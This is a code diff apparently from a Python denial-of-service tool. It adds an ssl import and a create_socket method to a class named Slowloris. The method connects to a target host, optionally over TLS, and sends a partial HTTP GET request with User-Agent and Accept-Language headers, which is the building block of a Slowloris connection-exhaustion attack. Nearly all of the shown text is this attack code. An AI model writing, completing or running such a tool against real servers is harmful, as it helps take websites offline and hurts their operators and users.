@@ -7,6 +7,7 @@ import socket
 import urllib.request
 import time
 import threading
+import ssl
 
 
 def get_parameter():
@@ -240,6 +241,24 @@ class Slowloris:
         self.port = port_target
         self.is_https = it_is_https
     
+    def create_socket(self) -> socket.socket:
+        """create a socket for us"""
+        
+        s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s_socket.settimeout(4)
+        
+        if self.is_https:
+            ctx = ssl.create_default_context()
+            s_socket = ctx.wrap_socket(s_socket, self.host)
+        
+        s_socket.connect((self.host, self.port))
+        
+        s_socket.send(self.create_get_request_packet())
+        s_socket.send(self.create_usr_agent_header())
+        s_socket.send(self.create_accept_language_header())
+
+        return s_socket
+        
     def create_get_request_packet(self) -> bytes:
         """ return request get """
         
